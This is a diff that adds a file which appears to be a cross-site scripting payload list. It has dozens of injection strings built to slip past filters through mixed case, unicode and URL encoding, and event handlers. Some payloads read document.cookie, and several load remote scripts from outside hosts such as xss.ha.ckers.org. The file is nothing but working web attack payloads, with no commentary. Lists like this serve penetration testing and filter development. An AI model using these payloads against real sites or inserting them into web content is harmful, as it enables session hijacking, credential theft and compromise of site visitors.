@@ -1,0 +1,83 @@
+</script>"><script>prompt(1)</script>
+</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
+"><img src=x onerror=prompt(1)>
+"><svg/onload=prompt(1)>
+"><iframe/src=javascript:prompt(1)>
+"><h1 onclick=prompt(1)>Clickme</h1>
+"><a href=javascript:prompt(1)>Clickme</a>
+"><a href="javascript:confirm%28 1%29">Clickme</a>
+"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>
+"><textarea autofocus onfocus=prompt(1)>
+"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>
+"><script>co\u006efir\u006d`1`</script>
+"><ScRiPt>co\u006efir\u006d`1`</ScRiPt>
+"><img src=x onerror=co\u006efir\u006d`1`>
+"><svg/onload=co\u006efir\u006d`1`>
+"><iframe/src=javascript:co\u006efir\u006d%28 1%29>
+"><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>
+"><a href=javascript:prompt%28 1%29>Clickme</a>
+"><a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>
+"><textarea autofocus onfocus=co\u006efir\u006d(1)>
+"><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome
+"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme
+"><img/src=x%0Aonerror=prompt`1`>
+"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">
+"><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
+'><script>alert(document.cookie)</script> 
+ ='><script>alert(document.cookie)</script> 
+ <script>alert(document.cookie)</script> 
+ <script>alert(vulnerable)</script> 
+ %3Cscript%3Ealert('XSS')%3C/script%3E 
+ <script>alert('XSS')</script> 
+ <img src="javascript:alert('XSS')"> 
+ %0a%0a<script>alert(\"Vulnerable\")</script>.jsp 
+ %22%3cscript%3ealert(%22xss%22)%3c/script%3e 
+ <script>alert('Vulnerable');</script> 
+ <script>alert('Vulnerable')</script> 
+ a.jsp/<script>alert('Vulnerable')</script> 
+ a?<script>alert('Vulnerable')</script> 
+ "><script>alert('Vulnerable')</script> 
+ %22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E 
+ %3Cscript%3Ealert(document. domain);%3C/script%3E& 
+ %3Cscript%3Ealert(document.domain);%3C/script%3E&SESSION_ID={SESSION_ID}&SESSION_ID= 
+ <IMG SRC="javascript:alert('XSS');"> 
+ <IMG SRC=javascript:alert('XSS')> 
+ <IMG SRC="jav ascript:alert('XSS');"> 
+ <IMG SRC="javascript:alert('XSS');"> 
+ "<IMG SRC=java\0script:alert(\"XSS\")>";' > out  
+ <SCRIPT>a=/XSS/alert(a.source)</SCRIPT> 
+ <BODY BACKGROUND="javascript:alert('XSS')"> 
+ <BODY ONLOAD=alert('XSS')> 
+ <IMG DYNSRC="javascript:alert('XSS')"> 
+ <IMG LOWSRC="javascript:alert('XSS')"> 
+ <BGSOUND SRC="javascript:alert('XSS');"> 
+ <br size="&{alert('XSS')}"> 
+ <LAYER SRC="http://xss.ha.ckers.org/a.js"></layer> 
+ <LINK REL="stylesheet" HREF="javascript:alert('XSS');"> 
+ <IMG SRC='vbscript:msgbox("XSS")'> 
+ <IMG SRC="mocha:[code]"> 
+ <IMG SRC="livescript:[code]"> 
+ <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"> 
+ <IFRAME SRC=javascript:alert('XSS')></IFRAME> 
+ <FRAMESET><FRAME SRC=javascript:alert('XSS')></FRAME></FRAMESET> 
+ <TABLE BACKGROUND="javascript:alert('XSS')"> 
+ <DIV STYLE="background-image: url(javascript:alert('XSS'))"> 
+ <DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html');"> 
+ <DIV STYLE="width: expression(alert('XSS'));"> 
+ <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE> 
+ <IMG STYLE='xss:expre\ssion(alert("XSS"))'> 
+ <STYLE TYPE="text/javascript">alert('XSS');</STYLE> 
+ <STYLE TYPE="text/css">.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><ACLASS=XSS></A> 
+ <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE> 
+ <BASE HREF="javascript:alert('XSS');//"> 
+ <XML SRC="javascript:alert('XSS');"> 
+ "> <BODY ><SCRIPT>function a(){alert('XSS');}</SCRIPT><" 
+ <SCRIPT SRC="http://xss.ha.ckers.org/xss.jpg"></SCRIPT> 
+ <IMG SRC="javascript:alert('XSS')" 
+ <IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"> 
+ <SCRIPT a=">" SRC="http://xss.ha.ckers.org/a.js"></SCRIPT> 
+ <SCRIPT =">" SRC="http://xss.ha.ckers.org/a.js"></SCRIPT> 
+ <SCRIPT a=">" '' SRC="http://xss.ha.ckers.org/a.js"></SCRIPT> 
+ <SCRIPT "a='>'" SRC="http://xss.ha.ckers.org/a.js"></SCRIPT> 
+ <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://xss.ha.ckers.org/a.js"></SCRIPT> 
+ <A HREF=http://www.gohttp://www.google.com/ogle.com/>link</A> 
